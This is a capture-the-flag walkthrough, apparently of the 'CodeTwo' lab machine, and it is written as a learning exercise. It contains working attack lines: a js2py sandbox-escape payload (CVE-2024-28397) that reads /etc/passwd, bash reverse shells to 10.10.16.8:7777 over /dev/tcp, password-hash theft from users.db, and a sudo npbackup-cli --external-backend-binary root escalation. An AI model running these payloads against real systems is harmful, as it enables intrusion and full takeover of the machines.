# CodeTwo Machine Linux 

# Port 8000
From `nmap` scan I found port `8000`. 

From the **download app** we got a zip file with **app.py**. In this file there was a hardcoded **Flask** secret key.

In that same file I was able to find:
```
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

That /run_code endpoint is a goldmine because it gives you arbitrary JS execution via js2py. 
And js2py isn’t safe — it can be escaped into Python and then into system RCE. 
The challenge is to craft the right payload to break out of the JS interpreter and get command execution.

I went online and tried to see if there was any exploits for this and found:
https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

Making sure to only use the JS payload in the sandbox I had to tweak the last line to:
`findpopen(obj)(["/bin/sh","-c","cat /etc/passwd"], 0, null, null, -1).communicate()[0].decode()`, why?


When I first tried to call `subprocess.Popen` through my `findpopen` function, I copied a payload that looked like this:

```js
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
```

But that blew up with:

```
Error: 'Non-Type' object is not callable
```

That told me either I wasn’t actually calling the `Popen` class, or I was passing the wrong arguments. After debugging a bit (printing out `findpopen(obj).__module__` and `.__name__`), I confirmed I really was reaching `subprocess.Popen`. So the issue had to be the way the arguments were mapped.

In Python, `subprocess.Popen` has the signature:

```python
Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, ...)
```

When you call it from inside `js2py`, you don’t get keyword arguments like in normal Python. If you try to pass a JS object `{stdout: -1}` hoping it turns into a kwarg, it actually just becomes the second positional argument. That’s why I hit the error **“bufsize must be an integer”** — because I had accidentally passed a dictionary where `Popen` was expecting an integer.

The fix was to pass everything positionally up to the argument I cared about. So instead of trying to pass `stdout=-1` by keyword, I passed:

```js
["/bin/sh","-c","cat /etc/passwd"], 0, null, null, -1
```

* `["/bin/sh","-c","cat /etc/passwd"]` → my command
* `0` → `bufsize`
* `null` → `executable`
* `null` → `stdin`
* `-1` → `stdout` (which is what `subprocess.PIPE` maps to internally)

That finally gave me a valid `Popen` object. Then calling:

```js
.communicate()[0].decode()
```

let me capture and convert the output from bytes into a readable string.

So the short version is: the original failure came from trying to use keyword arguments in a context (`js2py → Python bridge`) where they don’t work. By carefully lining up the positional args from the Python signature and watching the error messages, I figured out exactly which value was landing in the wrong slot, and corrected it.

# Shell
To get a reverse shell I had to tweak a bit more (with explanation):
`n11 = findpopen(obj)("bash -c 'bash -i >& /dev/tcp/10.10.16.8/7777 0>&1'", -1, null, -1, -1, -1, null, null, true).communicate()[0].decode()`


Key differences:

**bufsize = -1 → default buffering**

**stdout = -1, stderr = -1 → captured properly**

**shell = true (the last argument)**

By passing shell=True, Python runs your string through the shell, so bash -c 'bash -i >& /dev/tcp/…' is interpreted correctly.

All the file descriptors (-1) make sure Python captures stdout/stderr so communicate() doesn’t break.

TL;DR

The first payload failed because shell=False (default) and you passed a string command with redirection. Python didn’t interpret >& /dev/tcp/... as shell syntax.

The second payload worked because you explicitly set shell=True at the end, letting the shell interpret your string command.

In js2py, because of positional args mapping, you had to pass a lot of null or -1 placeholders just to reach the shell=True parameter at the correct position.

Once I got a hit, I was not able to access **Marco** but I did have access to `/app`. 
I checked the directories and I saw `/instance` which then led me to `users.db` where I was able to get the hashed password for **Marco**.

# Root 
Once I was in as **Marco** I was then able to get the first user flag.
I checked right away for `sudo -l` and showed I execute /usr/local/bin/npbackup-cli with root privileges.

```
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

* `(ALL : ALL)` → you can run this command as **any user** and as **root**.
* `NOPASSWD` → you **don’t need to enter a password**.
* `/usr/local/bin/npbackup-cli` → this is the **binary you’re allowed to run as root**.

```bash
/usr/local/bin/npbackup-cli --help
```

```bash
sudo /usr/local/bin/npbackup-cli --help


```

This is gave a lot of inormation of what I will be using specifically for a shell to get to root. 
I used flags like `--dump` `--raw` and did not give me much, as if it was blocked so looking back, I and focusing on shell:

--external-backend-binary EXTERNAL_BACKEND_BINARY

Some backup CLIs let you specify an external binary. Running a binary you control as root is a direct path to root shell.

Commands:
`vim rvshell` that had:

`#!/bin/bash
bash -c 'bash -i >& /dev/tcp/YOURIP/7777 0>&1'`

Then, `chmod +x rvshell`

Started a `nc -lvnp 7777` on my host machine.

Final command, made sure to read `--help` and see what flags can be used:
`sudo /usr/local/bin/npbackup-cli --config npbackup.conf --external-backend-binary=/home/marco/rvshell -b --repo-name default`.

Here I was able to get a reverse shell on my listening port and access root and get the final flag. 


✅ Summary of My Exploit Path

I discovered a Flask app exposing a /run_code endpoint executing arbitrary JS via js2py.

I found and used a sandbox escape via CVE-2024-28397 to execute Python commands and eventually run system commands.

I escaped the sandbox, dumped files like /etc/passwd, and pivoted to a reverse shell.

Found a users.db file under /instance/, cracked Marco’s password, and accessed the next user.

Discovered npbackup-cli was executable as root via sudo, and abused the --external-backend-binary flag to get a root shell by running my custom reverse shell script as root.


❌ My Mistakes & Missteps
1. Misunderstanding argument passing in js2py → Python

I initially tried to use Python keyword args (stdout=-1) inside js2py.

But js2py converts JS objects into positional arguments, not keyword arguments, which broke things.

Mistake: assuming Python-style calling worked inside the JS sandbox.

2. Didn’t account for shell=True initially

My first reverse shell payload failed because I used shell syntax like bash -i >& /dev/tcp/... without setting shell=True.

That meant Python didn’t interpret it as a shell command — just as a string literal.

3. Using non-executable scripts

When creating my rshell or rvshell binaries, I initially didn’t make sure they were valid executables (no shebang or wrong perms).

Resulted in Exec format error when npbackup tried to call them.


💡 Key Takeaways (What I Learned)
🔸 1. js2py is dangerous

It’s a gateway to Python-level access. A simple endpoint like eval_js() can be exploited if unprotected.

Once escaped, it lets me call real Python classes like subprocess.Popen.

🔸 2. Python functions inside JS are positional-only

Keyword arguments don’t work through js2py.

I must carefully map out arguments positionally and use the Python function signature as a guide.

🔸 3. To get code execution from Popen I need:

Proper positional args.

stdout = -1 to capture output.

.communicate()[0].decode() to read and convert the output.

shell=True at the end if I’m using shell operators like >, &, |, etc.

🔸 4. Always read --help and man pages

The npbackup-cli tool had a full help output that hinted at the --external-backend-binary flag.

That was my entry to running any script as root, which is the clearest privilege escalation vector possible.

🔸 5. Don’t ignore .db or instance folders in Flask apps

The instance/ folder in Flask is often where SQLite databases or secrets are stored.

users.db led directly to password hashes I could crack to move forward.


🧠 Things to Remember Next Time

Sandbox escapes aren't useful unless you understand the host language — in this case, Python.

When doing RCE, think about command syntax vs execution context (i.e., shell vs not).

Always check sudo -l right away after escalating users.

Privilege escalation often hides in configurable binary paths — if I can specify what to execute, I can run my own code.

When facing a wrapper or third-party tool (like npbackup), check:

--config file format

Permissions of config/data files

Allowed CLI options



🏁 Final Notes
This challenge tested:

Sandbox escape understanding

Python internals via js2py

Reverse shell crafting and behavior

Real-world privilege escalation via user-controlled binary execution

